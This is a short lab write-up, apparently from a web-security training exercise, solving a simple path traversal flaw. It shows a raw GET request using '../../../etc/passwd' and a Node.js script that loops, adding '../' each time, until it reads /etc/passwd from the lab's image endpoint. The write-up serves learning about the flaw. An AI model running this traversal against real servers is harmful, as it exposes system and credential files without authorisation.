# 1 - Simple Case

### Notes

The app loads images by passing the filename as a parameter to the back end:

```html
<img src="/image?filename=22.jpg">
```

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```

The server responds with a 400 status code if the requested file cannot be returned so it is simply a matter of chaining `../` until we receive the contents of `/etc/passwd`.

### Scripted Solution

```javascript
const axios = require('axios').default
require('dotenv').config({ path: './.env' })

/**
 * Run exploit.
 */
async function main() {
  const labUrl = process.env.LAB_URL

  let directoryTravsersalPayload = '../etc/passwd'

  while (true) {
    const imageFileUrl = `${labUrl}/image?filename=${directoryTravsersalPayload}`

    // Note axios will error on status 400 responses, a valid response will be 200
    try {
      const res = await axios.get(imageFileUrl)

      console.log(`File etc/passwd located at: ${directoryTravsersalPayload}.`)
      console.log(' ')
      console.log('Contents of /etc/passwd:')
      console.log(res.data)

      break
    } catch {
      // Move up one directory and try again
      directoryTravsersalPayload = '../' + directoryTravsersalPayload

      continue
    }
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```
